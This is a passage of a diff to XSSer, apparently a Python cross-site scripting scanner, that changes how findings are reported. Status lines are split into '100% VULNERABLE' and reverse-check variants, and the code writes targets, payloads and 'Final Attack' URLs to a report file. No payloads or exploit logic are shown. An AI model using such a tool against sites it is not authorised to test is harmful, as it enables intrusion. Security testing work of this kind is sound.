+                                    fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
+                                else:
+                                    if self.options.reversecheck:
+                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
+                                    else:
+                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                         else:
                             if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
-                                fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND!\n\n")
+                                if self.token_arrived_flag == True:
+                                    fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
+                                else:
+                                    if self.options.reversecheck:
+                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
+                                    else:
+                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                             else:
-                                fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND!\n\n")
+                                if self.token_arrived_flag == True:
+                                    fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
+                                else:
+                                    if self.options.reversecheck:
+                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
+                                    else:
+                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                         fout.write("="*75 + "\n\n")
             elif line[1] == "[Heuristic test]":
                 if len(self.hash_found) < 11:
@@ -3209,7 +3413,13 @@ class xsser(EncoderDecoder, XSSerReporter):
                     self.report("[!] Vulnerable:", line[1])
                     if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                         self.report("[*] Final Attack:", attack_url)
-                    self.report("[!] Status: XSS FOUND!",  "\n", '-'*50, "\n")
+                    if self.token_arrived_flag == True:
+                        self.report("[!] Status: XSS FOUND! [100% VULNERABLE]",  "\n", '-'*50, "\n")
+                    else:
+                        if self.options.reversecheck:
+                            self.report("[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]",  "\n", '-'*50, "\n")
+                        else:
+                            self.report("[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]",  "\n", '-'*50, "\n")
                 if self.options.fileoutput:
                     fout.write("="*75)
                     fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
@@ -3217,16 +3427,39 @@ class xsser(EncoderDecoder, XSSerReporter):
                     for line in self.hash_found:
                         if line[4]:
                             if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
-                                fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND!\n\n")
+                                if self.token_arrived_flag == True:
+                                    fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
+                                else:
+                                    if self.options.reversecheck:
+                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
+                                    else:
+                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                             else:
-                                fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND!\n\n")
+                                if self.token_arrived_flag == True:
+                                    fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
+                                else:
+                                    if self.options.reversecheck:
+                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
+                                    else:
+                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                         else:
                             if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
-                                fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND!\n\n")
+                                if self.token_arrived_flag == True:
+                                    fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
+                                else:
+                                    if self.options.reversecheck:
+                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
+                                    else:
+                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                             else:
-                                fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND!\n\n")
+                                if self.token_arrived_flag == True:
+                                    fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
+                                else:
+                                    if self.options.reversecheck:
+                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
+                                    else:
+                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                         fout.write("="*75 + "\n\n")
-
         if self.options.fileoutput:
             fout.close()
         if self.options.fileoutput and not self.options.filexml:
@@ -3237,7 +3470,7 @@ class xsser(EncoderDecoder, XSSerReporter):
            self.report("-"*25+"\n")
         if len(self.hash_found) > 10 and not self.options.fileoutput: # write results fo file when large output (white magic!)
             if not self.options.filexml: 
-                self.report("[Info] Aborting large screen output. Generating report: [ XSSreport.raw ]\n")
+                self.report("[Info] Aborting large screen output. Generating auto-report at: [ XSSreport.raw ] ;-)\n")
                 self.report("-"*25+"\n")
                 fout = open("XSSreport.raw", "w") # write better than append
                 fout.write("="*75)
